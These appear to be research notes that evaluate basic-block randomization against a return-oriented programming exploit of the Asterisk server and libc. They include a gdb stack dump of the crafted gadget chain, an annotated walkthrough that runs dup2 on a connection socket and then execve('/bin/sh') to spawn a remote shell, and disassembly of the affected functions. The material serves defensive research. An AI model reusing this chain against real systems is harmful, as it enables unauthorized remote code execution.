We modified the exploit such that the used gadgets
are in the same code chunk as the spilled/to-be-patched
code pointer. A code chunk is a sequence of instructions
that end in an unconditional branch, i.e. jmp and ret.
In the "Binary Stirring: Self-randomization" paper basic 
blocks are defined as such code chunks.


Basic Block Randomization types
BBR1: basic blocks end in unconditional jumps, ret|jmp
BBR2: basic blocks end in unconditional jumps, ret, or conditional jumps
//BBR3: basic blocks as BBR2 but also ones that end in calls

address # num_bb: <BBR1> / <BBR2>
- address # same bb: <BBR1> / <BBR2>

Info about the code pointers and basic blocks:

(/usr/sbin/asterisk)
0x4740de # num_bb: 2 / 3 (#jmp after cj: none)
- 0x4740e2 # same bb: Y / Y
dist = 4 bytes

(/usr/sbin/asterisk)
0x4acb18 # num_bb: 8 / 23 (#jmp after cj: none)
- 0x4acb4d # same bb: Y / N
dist = 53 bytes

(/lib/x86_64-linux-gnu/libc-2.15.so)
0x7ffff745001a # num_bb: 7 / 20 (#jmp after cj: none)
- 0x7ffff7450040 # same bb: Y / N
- 0x7ffff7450048 # same bb: Y / N
- 0x7ffff7450055 # same bb: Y / N
dist = 59 bytes

(/lib/x86_64-linux-gnu/libc-2.15.so)
0x7ffff745ae88 # num_bb: 11 / 35(#jmp after cj: 3)
- 0x7ffff745aeb0 # same bb: Y / N
dist = 40 bytes

(/lib/x86_64-linux-gnu/libc-2.15.so)
0x7ffff745bece # num_bb: 1 / 2(#jmp after cj: none)
- 0x7ffff745bee2 # same bb: Y / N
dist = 20 bytes

(/lib/x86_64-linux-gnu/libc-2.15.so)
0x7ffff74644aa # num_bb: 17 / 61(#jmp after cj: 9 [optim])
- 0x7ffff74644aa # identical same bb: Y / Y
dist =  0 bytes

(/lib/x86_64-linux-gnu/libc-2.15.so)
0x7ffff74c6f42/59 # num_bb: 3 / 6(#jmp after cj: none)
- 0x7ffff74c6f4b # same bb: Y / Y
- 0x7ffff74c6f4d # same bb: Y / Y
- 0x7ffff74c6f5c # same bb: Y / Y
dist = 17 bytes


* The massaged and patched code pointers
--------------------------------------------------------
gdb-peda$ x/110gx $rsp-0x10
0x7fff94ebc5a0: 0x0000000000000000  0x00007ffff74644aa RSP <- start here !
0x7fff94ebc5b0: 0x00007fff90001e90  0x0000000000000021
0x7fff94ebc5c0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc5d0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc5e0: 0x0000000000000000  0x00000000004740e2
0x7fff94ebc5f0: 0x00007fff94ebc640  0x00000000fbad2483
0x7fff94ebc600: 0x00007fff900020d0  0x00007fff94ebc640
0x7fff94ebc610: 0x00007fff94f766b0  0x0000000000000000
0x7fff94ebc620: 0x0000000000000000  0x0000000000000000
0x7fff94ebc630: 0x000000000053f3af  0x00000000004acb4d
0x7fff94ebc640: 0x0000000000000000  0x0000000000000000
0x7fff94ebc650: 0x0000000000000000  0x00007ffff74c6f4d
0x7fff94ebc660: 0x0000000000000000  0x00007ffff745aeb0
0x7fff94ebc670: 0x3636363636363636  0x00007fff90003510
0x7fff94ebc680: 0x00000000000b9f40  0x00007ffff745bee2
0x7fff94ebc690: 0x00007fff90003510  0x00007ffff7450055
0x7fff94ebc6a0: 0x0000000000000049  0x00007ffff74c6f4b
0x7fff94ebc6b0: 0x0000000000000000  0x00007ffff745aeb0
0x7fff94ebc6c0: 0x3a3a3a3a3a3a3a3a  0x00007fff90001f90
0x7fff94ebc6d0: 0x00000000000b9ef0  0x00007ffff745bee2
0x7fff94ebc6e0: 0x00007fff90001f90  0x00007ffff7450048
0x7fff94ebc6f0: 0x00007fff94f76b10  0x00007fff94ebc770
0x7fff94ebc700: 0x0000000000000000  0x00007ffff74c6f59
0x7fff94ebc710: 0x0000000000000000  0x00007ffff745ae88
0x7fff94ebc720: 0x00007fff94ebc770  0x0000000000000000
0x7fff94ebc730: 0x0000000000000000  0x0000000000000000
0x7fff94ebc740: 0x0000000000000000  0x00007ffff745aeb0
0x7fff94ebc750: 0x00007fff94ebc770  0x00007fff90001f90
0x7fff94ebc760: 0x00000000000b9e60  0x00007ffff745bee2
0x7fff94ebc770: 0x00007fff90001f90  0x00007ffff7450055
0x7fff94ebc780: 0x00007fff94ebc7d0  0x00007ffff74c6f5c
0x7fff94ebc790: 0x0000000000000000  0x00007ffff745aeb0
0x7fff94ebc7a0: 0x00007fff94f76b10  0x00007fff90001f90
0x7fff94ebc7b0: 0x0000000000000000  0x00007ffff745bee2
0x7fff94ebc7c0: 0x00007fff90001f90  0x00007ffff7450048
0x7fff94ebc7d0: 0x0068732f6e69622f  0x0000000000000000
0x7fff94ebc7e0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc7f0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc800: 0x0000000000000000  0x0000000000000000
0x7fff94ebc810: 0x0000000000000000  0x0000000000000000
0x7fff94ebc820: 0x000000000000003b  0x00007ffff74c6f5c
0x7fff94ebc830: 0x0000000000000000  0x00007ffff745aeb0
0x7fff94ebc840: 0x00007fffd8007ed8  0x00007fff90001f90
0x7fff94ebc850: 0x00000000000b9d70  0x00007ffff745bee2
0x7fff94ebc860: 0x00007fff90001f90  0x00007ffff7450040
0x7fff94ebc870: 0x4747474747474747  0x0000000000000000
0x7fff94ebc880: 0x0000000000000000  0x0000000000000000
0x7fff94ebc890: 0x0000000000000000  0x0000000000000000
0x7fff94ebc8a0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc8b0: 0x0000000000000000  0x0000000000000000
0x7fff94ebc8c0: 0x0000000000000000  0x00007ffff74c6f4b
--------------------------------------------------------

# set dup2 syscall in rbx
* The executed gadgets
=> 0x7ffff74644aa <__libc_calloc+714>:  jmp    0x7ffff7464316 <__libc_calloc+310>
   0x7ffff7464316 <__libc_calloc+310>:  mov    rax,rbx
   0x7ffff7464319 <__libc_calloc+313>:  mov    rbp,QWORD PTR [rsp+0x10]
   0x7ffff746431e <__libc_calloc+318>:  mov    rbx,QWORD PTR [rsp+0x8]
   0x7ffff7464323 <__libc_calloc+323>:  mov    r12,QWORD PTR [rsp+0x18]
   0x7ffff7464328 <__libc_calloc+328>:  mov    r13,QWORD PTR [rsp+0x20]
   0x7ffff746432d <__libc_calloc+333>:  mov    r14,QWORD PTR [rsp+0x28]
   0x7ffff7464332 <__libc_calloc+338>:  mov    r15,QWORD PTR [rsp+0x30]
   0x7ffff7464337 <__libc_calloc+343>:  add    rsp,0x38
   0x7ffff746433b <__libc_calloc+347>:  ret

# set dup2 syscall in rax
=> 0x4740e2 <ast_variable_new+178>: mov    rax,rbx
   0x4740e5 <ast_variable_new+181>: mov    rbp,QWORD PTR [rsp+0x20]
   0x4740ea <ast_variable_new+186>: mov    rbx,QWORD PTR [rsp+0x18]
   0x4740ef <ast_variable_new+191>: mov    r12,QWORD PTR [rsp+0x28]
   0x4740f4 <ast_variable_new+196>: mov    r13,QWORD PTR [rsp+0x30]
   0x4740f9 <ast_variable_new+201>: mov    r14,QWORD PTR [rsp+0x38]
   0x4740fe <ast_variable_new+206>: mov    r15,QWORD PTR [rsp+0x40]
   0x474103 <ast_variable_new+211>: add    rsp,0x48
   0x474107 <ast_variable_new+215>: ret  

# set second argument, rsi, of dup2 syscall to zero (fd)
# rsi is reused when calling execve(2nd arg)
# note: on success dup2 propagated rsi to rax
=> 0x4acb4d <ast_http_get_post_vars+365>: pop    rsi
   0x4acb4e <ast_http_get_post_vars+366>: pop    r15
   0x4acb50 <ast_http_get_post_vars+368>: pop    rbp
   0x4acb51 <ast_http_get_post_vars+369>: ret    

# intermediate code/gadget, NOP gadget
=> 0x7ffff74c6f4d <read+45>:  mov    rdi,QWORD PTR [rsp]
   0x7ffff74c6f51 <read+49>:  mov    rdx,rax
   0x7ffff74c6f54 <read+52>:  call   0x7ffff74e2100 <__libc_disable_asynccancel>
   0x7ffff74c6f59 <read+57>:  mov    rax,rdx
   0x7ffff74c6f5c <read+60>:  add    rsp,0x8
   0x7ffff74c6f60 <read+64>:  cmp    rax,0xfffffffffffff001
   0x7ffff74c6f66 <read+70>:  jae    0x7ffff74c6f69 <read+73>
   0x7ffff74c6f68 <read+72>:  ret    

# NOP gadget
=> 0x7ffff745aeb0 <_IO_new_file_underflow+336>: add    rsp,0x8
   0x7ffff745aeb4 <_IO_new_file_underflow+340>: pop    rbx
   0x7ffff745aeb5 <_IO_new_file_underflow+341>: pop    rbp
   0x7ffff745aeb6 <_IO_new_file_underflow+342>: ret  

# NOP gadget
=> 0x7ffff745bee2 <_IO_default_uflow+34>: pop    rbx
   0x7ffff745bee3 <_IO_default_uflow+35>: ret    

# set first argument, rdi, of dup2 syscall to the fd of an open connection
=> 0x7ffff7450055 <_IO_getline_info+229>: pop    rdi
   0x7ffff7450056 <_IO_getline_info+230>: ret    

# execute dup2 syscall
# on success, newfd/rsi which is 0 is returned in RAX
# set third argument, rdx, of execve syscall to 0/NULL
=> 0x7ffff74c6f4b <read+43>:  syscall 
   0x7ffff74c6f4d <read+45>:  mov    rdi,QWORD PTR [rsp]
   0x7ffff74c6f51 <read+49>:  mov    rdx,rax
   0x7ffff74c6f54 <read+52>:  call   0x7ffff74e2100 <__libc_disable_asynccancel>
   0x7ffff74c6f59 <read+57>:  mov    rax,rdx
   0x7ffff74c6f5c <read+60>:  add    rsp,0x8
   0x7ffff74c6f60 <read+64>:  cmp    rax,0xfffffffffffff001
   0x7ffff74c6f66 <read+70>:  jae    0x7ffff74c6f69 <read+73>
   0x7ffff74c6f68 <read+72>:  ret    

# NOP gadget
=> 0x7ffff745aeb0 <_IO_new_file_underflow+336>: add    rsp,0x8
   0x7ffff745aeb4 <_IO_new_file_underflow+340>: pop    rbx
   0x7ffff745aeb5 <_IO_new_file_underflow+341>: pop    rbp
   0x7ffff745aeb6 <_IO_new_file_underflow+342>: ret    

# NOP gadget
=> 0x7ffff745bee2 <_IO_default_uflow+34>: pop    rbx
   0x7ffff745bee3 <_IO_default_uflow+35>: ret    

# NOP gadget
=> 0x7ffff7450048 <_IO_getline_info+216>: add    rsp,0x28
   0x7ffff745004c <_IO_getline_info+220>: pop    rbx
   0x7ffff745004d <_IO_getline_info+221>: pop    rbp
   0x7ffff745004e <_IO_getline_info+222>: pop    r12
   0x7ffff7450050 <_IO_getline_info+224>: pop    r13
   0x7ffff7450052 <_IO_getline_info+226>: pop    r14
   0x7ffff7450054 <_IO_getline_info+228>: pop    r15
   0x7ffff7450056 <_IO_getline_info+230>: ret    

# NOP gadget
=> 0x7ffff745aeb0 <_IO_new_file_underflow+336>: add    rsp,0x8
   0x7ffff745aeb4 <_IO_new_file_underflow+340>: pop    rbx
   0x7ffff745aeb5 <_IO_new_file_underflow+341>: pop    rbp
   0x7ffff745aeb6 <_IO_new_file_underflow+342>: ret    

# NOP gadget
=> 0x7ffff745bee2 <_IO_default_uflow+34>: pop    rbx
   0x7ffff745bee3 <_IO_default_uflow+35>: ret    

# set first argument, rdi, of execve syscall to a stack ptr, pointing to "/bin/sh\0"
=> 0x7ffff7450055 <_IO_getline_info+229>: pop    rdi
   0x7ffff7450056 <_IO_getline_info+230>: ret    

# NOP gadget
=> 0x7ffff74c6f5c <read+60>:  add    rsp,0x8
   0x7ffff74c6f60 <read+64>:  cmp    rax,0xfffffffffffff001
   0x7ffff74c6f66 <read+70>:  jae    0x7ffff74c6f69 <read+73>
   0x7ffff74c6f68 <read+72>:  ret    

# NOP gadget
=> 0x7ffff745aeb0 <_IO_new_file_underflow+336>: add    rsp,0x8
   0x7ffff745aeb4 <_IO_new_file_underflow+340>: pop    rbx
   0x7ffff745aeb5 <_IO_new_file_underflow+341>: pop    rbp
   0x7ffff745aeb6 <_IO_new_file_underflow+342>: ret    

# NOP gadget
=> 0x7ffff745bee2 <_IO_default_uflow+34>: pop    rbx
   0x7ffff745bee3 <_IO_default_uflow+35>: ret    

# set r15 to execve syscall number
=> 0x7ffff7450048 <_IO_getline_info+216>: add    rsp,0x28
   0x7ffff745004c <_IO_getline_info+220>: pop    rbx
   0x7ffff745004d <_IO_getline_info+221>: pop    rbp
   0x7ffff745004e <_IO_getline_info+222>: pop    r12
   0x7ffff7450050 <_IO_getline_info+224>: pop    r13
   0x7ffff7450052 <_IO_getline_info+226>: pop    r14
   0x7ffff7450054 <_IO_getline_info+228>: pop    r15
   0x7ffff7450056 <_IO_getline_info+230>: ret    

# NOP gadget
=> 0x7ffff74c6f5c <read+60>:  add    rsp,0x8
   0x7ffff74c6f60 <read+64>:  cmp    rax,0xfffffffffffff001
   0x7ffff74c6f66 <read+70>:  jae    0x7ffff74c6f69 <read+73>
   0x7ffff74c6f68 <read+72>:  ret    

# NOP gadget
=> 0x7ffff745aeb0 <_IO_new_file_underflow+336>: add    rsp,0x8
   0x7ffff745aeb4 <_IO_new_file_underflow+340>: pop    rbx
   0x7ffff745aeb5 <_IO_new_file_underflow+341>: pop    rbp
   0x7ffff745aeb6 <_IO_new_file_underflow+342>: ret    

# NOP gadget
=> 0x7ffff745bee2 <_IO_default_uflow+34>: pop    rbx
   0x7ffff745bee3 <_IO_default_uflow+35>: ret    

# set rax to execve syscall number
=> 0x7ffff7450040 <_IO_getline_info+208>: mov    rax,r15
   0x7ffff7450043 <_IO_getline_info+211>: sub    rax,QWORD PTR [rsp+0x8]
   0x7ffff7450048 <_IO_getline_info+216>: add    rsp,0x28
   0x7ffff745004c <_IO_getline_info+220>: pop    rbx
   0x7ffff745004d <_IO_getline_info+221>: pop    rbp
   0x7ffff745004e <_IO_getline_info+222>: pop    r12
   0x7ffff7450050 <_IO_getline_info+224>: pop    r13
   0x7ffff7450052 <_IO_getline_info+226>: pop    r14
   0x7ffff7450054 <_IO_getline_info+228>: pop    r15
   0x7ffff7450056 <_IO_getline_info+230>: ret    

# execute the execve syscall to start /bin/sh
=> 0x7ffff74c6f4b <read+43>:  syscall  => execve("/bin/sh\0",NULL,NULL)
   0x7ffff74c6f4d <read+45>:  mov    rdi,QWORD PTR [rsp]
   0x7ffff74c6f51 <read+49>:  mov    rdx,rax
   0x7ffff74c6f54 <read+52>:  call   0x7ffff74e2100 <__libc_disable_asynccancel>
   0x7ffff74c6f59 <read+57>:  mov    rax,rdx
   0x7ffff74c6f5c <read+60>:  add    rsp,0x8
   0x7ffff74c6f60 <read+64>:  cmp    rax,0xfffffffffffff001
   0x7ffff74c6f66 <read+70>:  jae    0x7ffff74c6f69 <read+73>
   0x7ffff74c6f68 <read+72>:  ret    







* Disassembly of the massaged/patched code pointers

gdb-peda$ disas 0x4740de
Dump of assembler code for function ast_variable_new:
------------------
   0x0000000000474030 <+0>: mov    QWORD PTR [rsp-0x30],rbx
   0x0000000000474035 <+5>: mov    QWORD PTR [rsp-0x28],rbp
   0x000000000047403a <+10>:  mov    rbp,rsi
   0x000000000047403d <+13>:  mov    QWORD PTR [rsp-0x20],r12
   0x0000000000474042 <+18>:  mov    QWORD PTR [rsp-0x18],r13
   0x0000000000474047 <+23>:  mov    r12,rdi
   0x000000000047404a <+26>:  mov    QWORD PTR [rsp-0x10],r14
   0x000000000047404f <+31>:  mov    QWORD PTR [rsp-0x8],r15
   0x0000000000474054 <+36>:  sub    rsp,0x48
   0x0000000000474058 <+40>:  mov    r15,rdx
   0x000000000047405b <+43>:  call   0x41d120 <strlen@plt>
   0x0000000000474060 <+48>:  mov    rdi,rbp
   0x0000000000474063 <+51>:  lea    r14d,[rax+0x1]
   0x0000000000474067 <+55>:  call   0x41d120 <strlen@plt>
   0x000000000047406c <+60>:  mov    rdi,r15
   0x000000000047406f <+63>:  lea    ebx,[rax+0x1]
   0x0000000000474072 <+66>:  call   0x41d120 <strlen@plt>
   0x0000000000474077 <+71>:  lea    r13d,[rax+0x1]
   0x000000000047407b <+75>:  mov    eax,0x28
   0x0000000000474080 <+80>:  mov    edi,0x1
   0x0000000000474085 <+85>:  cmp    r13d,0x27
   0x0000000000474089 <+89>:  cmovle r13d,eax
   0x000000000047408d <+93>:  lea    esi,[r13+r14*1+0x0]
   0x0000000000474092 <+98>:  add    esi,ebx
   0x0000000000474094 <+100>: movsxd rsi,esi
   0x0000000000474097 <+103>: add    rsi,0x48
   0x000000000047409b <+107>: call   0x41d4c0 <calloc@plt>
   0x00000000004740a0 <+112>: test   rax,rax
   0x00000000004740a3 <+115>: mov    rbx,rax
   0x00000000004740a6 <+118>: je     0x474108 <ast_variable_new+216>

   0x00000000004740a8 <+120>: movsxd r13,r13d
   0x00000000004740ab <+123>: lea    rdi,[rax+0x48]
   0x00000000004740af <+127>: mov    rsi,r15
   0x00000000004740b2 <+130>: lea    r13,[rbx+r13*1+0x48]
   0x00000000004740b7 <+135>: movsxd r14,r14d
   0x00000000004740ba <+138>: call   0x41d7c0 <strcpy@plt>
   0x00000000004740bf <+143>: mov    rsi,r12
   0x00000000004740c2 <+146>: mov    rdi,r13
   0x00000000004740c5 <+149>: mov    QWORD PTR [rbx+0x18],rax
   0x00000000004740c9 <+153>: call   0x41d7c0 <strcpy@plt>
   0x00000000004740ce <+158>: lea    rdi,[r13+r14*1+0x0]
   0x00000000004740d3 <+163>: mov    QWORD PTR [rbx],rax
   0x00000000004740d6 <+166>: mov    rsi,rbp
   0x00000000004740d9 <+169>: call   0x41d7c0 <strcpy@plt>
   0x00000000004740de <+174>: mov    QWORD PTR [rbx+0x8],rax
   0x00000000004740e2 <+178>: mov    rax,rbx
   0x00000000004740e5 <+181>: mov    rbp,QWORD PTR [rsp+0x20]
   0x00000000004740ea <+186>: mov    rbx,QWORD PTR [rsp+0x18]
   0x00000000004740ef <+191>: mov    r12,QWORD PTR [rsp+0x28]
   0x00000000004740f4 <+196>: mov    r13,QWORD PTR [rsp+0x30]
   0x00000000004740f9 <+201>: mov    r14,QWORD PTR [rsp+0x38]
   0x00000000004740fe <+206>: mov    r15,QWORD PTR [rsp+0x40]
   0x0000000000474103 <+211>: add    rsp,0x48
   0x0000000000474107 <+215>: ret    


   0x0000000000474108 <+216>: mov    r9d,0x552470
   0x000000000047410e <+222>: mov    r8d,0x53acd0
   0x0000000000474114 <+228>: mov    ecx,0x552460
   0x0000000000474119 <+233>: mov    edx,0x1ea
   0x000000000047411e <+238>: mov    esi,0x53ad10
   0x0000000000474123 <+243>: mov    edi,0x4
   0x0000000000474128 <+248>: xor    eax,eax
   0x000000000047412a <+250>: mov    QWORD PTR [rsp+0x8],0x55181d
   0x0000000000474133 <+259>: mov    DWORD PTR [rsp],0x11b
   0x000000000047413a <+266>: call   0x4b5bf0 <ast_log>
   0x000000000047413f <+271>: jmp    0x4740e2 <ast_variable_new+178>
   0x474141 : [next ins..]
------------------------
End of assembler dump.
gdb-peda$ disas 0x4acb18
Dump of assembler code for function ast_http_get_post_vars:
--------------------
   0x00000000004ac9e0 <+0>: push   rbp
   0x00000000004ac9e1 <+1>: mov    rbp,rsp
   0x00000000004ac9e4 <+4>: push   r15
   0x00000000004ac9e6 <+6>: push   r14
   0x00000000004ac9e8 <+8>: xor    r14d,r14d
   0x00000000004ac9eb <+11>:  push   r13
   0x00000000004ac9ed <+13>:  mov    r13,rsi
   0x00000000004ac9f0 <+16>:  push   r12
   0x00000000004ac9f2 <+18>:  mov    r12,rdi
   0x00000000004ac9f5 <+21>:  push   rbx
   0x00000000004ac9f6 <+22>:  sub    rsp,0x18
   0x00000000004ac9fa <+26>:  mov    rax,QWORD PTR fs:0x28
   0x00000000004aca03 <+35>:  mov    QWORD PTR [rbp-0x38],rax
   0x00000000004aca07 <+39>:  xor    eax,eax
   0x00000000004aca09 <+41>:  test   rsi,rsi
   0x00000000004aca0c <+44>:  je     0x4acb31 <ast_http_get_post_vars+337>

   0x00000000004aca12 <+50>:  mov    rbx,rsi
   0x00000000004aca15 <+53>:  jmp    0x4aca21 <ast_http_get_post_vars+65>


   0x00000000004aca17 <+55>:  nop
   0x00000000004aca18 <+56>:  mov    rbx,QWORD PTR [rbx+0x10]
   0x00000000004aca1c <+60>:  test   rbx,rbx
   0x00000000004aca1f <+63>:  je     0x4aca4b <ast_http_get_post_vars+107>

   0x00000000004aca21 <+65>:  mov    rdi,QWORD PTR [rbx]
   0x00000000004aca24 <+68>:  mov    esi,0x55e9a3
   0x00000000004aca29 <+73>:  call   0x41d950 <strcasecmp@plt>
   0x00000000004aca2e <+78>:  test   eax,eax
   0x00000000004aca30 <+80>:  jne    0x4aca18 <ast_http_get_post_vars+56>

   0x00000000004aca32 <+82>:  mov    rdi,QWORD PTR [rbx+0x8]
   0x00000000004aca36 <+86>:  mov    esi,0x55ef90
   0x00000000004aca3b <+91>:  xor    r14d,r14d
   0x00000000004aca3e <+94>:  call   0x41d950 <strcasecmp@plt>
   0x00000000004aca43 <+99>:  test   eax,eax
   0x00000000004aca45 <+101>: jne    0x4acb31 <ast_http_get_post_vars+337>

   0x00000000004aca4b <+107>: mov    rbx,r13
   0x00000000004aca4e <+110>: jmp    0x4aca5d <ast_http_get_post_vars+125>


   0x00000000004aca50 <+112>: mov    rbx,QWORD PTR [rbx+0x10]
   0x00000000004aca54 <+116>: test   rbx,rbx
   0x00000000004aca57 <+119>: je     0x4acb68 <ast_http_get_post_vars+392>

   0x00000000004aca5d <+125>: mov    rdi,QWORD PTR [rbx]
   0x00000000004aca60 <+128>: mov    esi,0x55e9b0
   0x00000000004aca65 <+133>: call   0x41d950 <strcasecmp@plt>
   0x00000000004aca6a <+138>: test   eax,eax
   0x00000000004aca6c <+140>: jne    0x4aca50 <ast_http_get_post_vars+112>

   0x00000000004aca6e <+142>: mov    rdi,QWORD PTR [rbx+0x8]
   0x00000000004aca72 <+146>: xor    esi,esi
   0x00000000004aca74 <+148>: mov    edx,0xa
   0x00000000004aca79 <+153>: call   0x41ddd0 <strtol@plt>
   0x00000000004aca7e <+158>: mov    esi,eax
   0x00000000004aca80 <+160>: inc    esi
   0x00000000004aca82 <+162>: je     0x4acb68 <ast_http_get_post_vars+392>

   0x00000000004aca88 <+168>: movsxd rax,esi
   0x00000000004aca8b <+171>: mov    rdx,QWORD PTR [r12]
   0x00000000004aca8f <+175>: add    rax,0x1e
   0x00000000004aca93 <+179>: and    rax,0xfffffffffffffff0
   0x00000000004aca97 <+183>: sub    rsp,rax
   0x00000000004aca9a <+186>: lea    rbx,[rsp+0xf]
   0x00000000004aca9f <+191>: and    rbx,0xfffffffffffffff0
   0x00000000004acaa3 <+195>: mov    rdi,rbx
   0x00000000004acaa6 <+198>: call   0x41e050 <fgets@plt>
   0x00000000004acaab <+203>: test   rax,rax
   0x00000000004acaae <+206>: je     0x4acb68 <ast_http_get_post_vars+392>

   0x00000000004acab4 <+212>: xor    r13d,r13d
   0x00000000004acab7 <+215>: xor    r14d,r14d
   0x00000000004acaba <+218>: jmp    0x4acb2c <ast_http_get_post_vars+332>


   0x00000000004acabc <+220>: nop    DWORD PTR [rax+0x0]
   0x00000000004acac0 <+224>: mov    esi,0x26
   0x00000000004acac5 <+229>: mov    rdi,rbx
   0x00000000004acac8 <+232>: call   0x41d0b0 <strchr@plt>
   0x00000000004acacd <+237>: test   rax,rax
   0x00000000004acad0 <+240>: mov    r12,rax
   0x00000000004acad3 <+243>: je     0x4acadb <ast_http_get_post_vars+251>

   0x00000000004acad5 <+245>: mov    BYTE PTR [rax],0x0
   0x00000000004acad8 <+248>: inc    r12
   0x00000000004acadb <+251>: mov    esi,0x3d
   0x00000000004acae0 <+256>: mov    rdi,rbx
   0x00000000004acae3 <+259>: call   0x41d0b0 <strchr@plt>
   0x00000000004acae8 <+264>: test   rax,rax
   0x00000000004acaeb <+267>: je     0x4acb58 <ast_http_get_post_vars+376>

   0x00000000004acaed <+269>: mov    r15,rax
   0x00000000004acaf0 <+272>: mov    BYTE PTR [rax],0x0
   0x00000000004acaf3 <+275>: inc    r15
   0x00000000004acaf6 <+278>: je     0x4acb58 <ast_http_get_post_vars+376>

   0x00000000004acaf8 <+280>: mov    rdi,r15
   0x00000000004acafb <+283>: call   0x4aaa50 <http_decode>
   0x00000000004acb00 <+288>: mov    rdi,rbx
   0x00000000004acb03 <+291>: call   0x4aaa50 <http_decode>
   0x00000000004acb08 <+296>: mov    edx,0x53f3af
   0x00000000004acb0d <+301>: mov    rsi,r15
   0x00000000004acb10 <+304>: mov    rdi,rbx
   0x00000000004acb13 <+307>: call   0x474030 <ast_variable_new>
   0x00000000004acb18 <+312>: test   rax,rax
   0x00000000004acb1b <+315>: je     0x4acb29 <ast_http_get_post_vars+329>

   0x00000000004acb1d <+317>: test   r14,r14
   0x00000000004acb20 <+320>: je     0x4acb60 <ast_http_get_post_vars+384>

   0x00000000004acb22 <+322>: mov    QWORD PTR [r13+0x10],rax
   0x00000000004acb26 <+326>: mov    r13,rax
   0x00000000004acb29 <+329>: mov    rbx,r12
   0x00000000004acb2c <+332>: test   rbx,rbx
   0x00000000004acb2f <+335>: jne    0x4acac0 <ast_http_get_post_vars+224>

   0x00000000004acb31 <+337>: mov    rdx,QWORD PTR [rbp-0x38]
   0x00000000004acb35 <+341>: xor    rdx,QWORD PTR fs:0x28
   0x00000000004acb3e <+350>: mov    rax,r14
   0x00000000004acb41 <+353>: jne    0x4acb6d <ast_http_get_post_vars+397>

   0x00000000004acb43 <+355>: lea    rsp,[rbp-0x28]
   0x00000000004acb47 <+359>: pop    rbx
   0x00000000004acb48 <+360>: pop    r12
   0x00000000004acb4a <+362>: pop    r13
   0x00000000004acb4c <+364>: pop    r14
   0x00000000004acb4e <+366>: pop    r15
   0x00000000004acb50 <+368>: pop    rbp
   0x00000000004acb51 <+369>: ret    


   0x00000000004acb52 <+370>: nop    WORD PTR [rax+rax*1+0x0]
   0x00000000004acb58 <+376>: mov    r15d,0x53f3af
   0x00000000004acb5e <+382>: jmp    0x4acb00 <ast_http_get_post_vars+288>


   0x00000000004acb60 <+384>: mov    r13,rax
   0x00000000004acb63 <+387>: mov    r14,rax
   0x00000000004acb66 <+390>: jmp    0x4acb29 <ast_http_get_post_vars+329>


   0x00000000004acb68 <+392>: xor    r14d,r14d
   0x00000000004acb6b <+395>: jmp    0x4acb31 <ast_http_get_post_vars+337>


   0x00000000004acb6d <+397>: call   0x41d9c0 <__stack_chk_fail@plt>

   0x4acb72 : [next ins..]
-------------------------
End of assembler dump.
gdb-peda$ disas 0x7ffff745001a
Dump of assembler code for function _IO_getline_info:
# comments: https://code.woboq.org/userspace/glibc/libio/iogetline.c.html#46
-------------------------
   0x00007ffff744ff70 <+0>: push   r15
   0x00007ffff744ff72 <+2>: push   r14
   0x00007ffff744ff74 <+4>: push   r13
   0x00007ffff744ff76 <+6>: push   r12
   0x00007ffff744ff78 <+8>: mov    r12d,ecx
   0x00007ffff744ff7b <+11>:  push   rbp
   0x00007ffff744ff7c <+12>:  mov    rbp,rdx
   0x00007ffff744ff7f <+15>:  push   rbx
   0x00007ffff744ff80 <+16>:  mov    rbx,rdi
   0x00007ffff744ff83 <+19>:  sub    rsp,0x28
   0x00007ffff744ff87 <+23>:  test   r9,r9
   0x00007ffff744ff8a <+26>:  mov    QWORD PTR [rsp+0x8],rsi
   0x00007ffff744ff8f <+31>:  mov    DWORD PTR [rsp+0x1c],r8d
   0x00007ffff744ff94 <+36>:  mov    QWORD PTR [rsp+0x10],r9
   0x00007ffff744ff99 <+41>:  je     0x7ffff744ffa2 <_IO_getline_info+50>

   0x00007ffff744ff9b <+43>:  mov    DWORD PTR [r9],0x0                     # line 52
   0x00007ffff744ffa2 <+50>:  mov    edx,DWORD PTR [rbx+0xc0]
   0x00007ffff744ffa8 <+56>:  test   edx,edx
   0x00007ffff744ffaa <+58>:  je     0x7ffff74500f6 <_IO_getline_info+390>

   0x00007ffff744ffb0 <+64>:  xor    eax,eax
   0x00007ffff744ffb2 <+66>:  test   rbp,rbp
   0x00007ffff744ffb5 <+69>:  je     0x7ffff7450048 <_IO_getline_info+216>

   0x00007ffff744ffbb <+75>:  mov    r15,QWORD PTR [rsp+0x8]
   0x00007ffff744ffc0 <+80>:  jmp    0x7ffff7450002 <_IO_getline_info+146>


   0x00007ffff744ffc2 <+82>:  nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff744ffc8 <+88>:  cmp    r13,rbp
   0x00007ffff744ffcb <+91>:  mov    esi,r12d
   0x00007ffff744ffce <+94>:  mov    rdi,r14
   0x00007ffff744ffd1 <+97>:  cmovae r13,rbp
   0x00007ffff744ffd5 <+101>: mov    rdx,r13
   0x00007ffff744ffd8 <+104>: call   0x7ffff746b1d0 <memchr>
   0x00007ffff744ffdd <+109>: test   rax,rax
   0x00007ffff744ffe0 <+112>: mov    rcx,rax
   0x00007ffff744ffe3 <+115>: jne    0x7ffff7450060 <_IO_getline_info+240>

   0x00007ffff744ffe5 <+117>: mov    rdi,r15
   0x00007ffff744ffe8 <+120>: mov    rdx,r13
   0x00007ffff744ffeb <+123>: mov    rsi,r14
   0x00007ffff744ffee <+126>: sub    rbp,r13
   0x00007ffff744fff1 <+129>: add    r15,r13
   0x00007ffff744fff4 <+132>: call   0x7ffff7471760 <__memcpy_sse2>
   0x00007ffff744fff9 <+137>: add    QWORD PTR [rbx+0x8],r13
   0x00007ffff744fffd <+141>: test   rbp,rbp
   0x00007ffff7450000 <+144>: je     0x7ffff7450040 <_IO_getline_info+208>

   0x00007ffff7450002 <+146>: mov    r14,QWORD PTR [rbx+0x8]
   0x00007ffff7450006 <+150>: mov    r13,QWORD PTR [rbx+0x10]
   0x00007ffff745000a <+154>: sub    r13,r14
   0x00007ffff745000d <+157>: test   r13,r13
   0x00007ffff7450010 <+160>: jg     0x7ffff744ffc8 <_IO_getline_info+88>

   0x00007ffff7450012 <+162>: mov    rdi,rbx
   0x00007ffff7450015 <+165>: call   0x7ffff745bd10 <__GI___uflow>
   0x00007ffff745001a <+170>: cmp    eax,0xffffffff
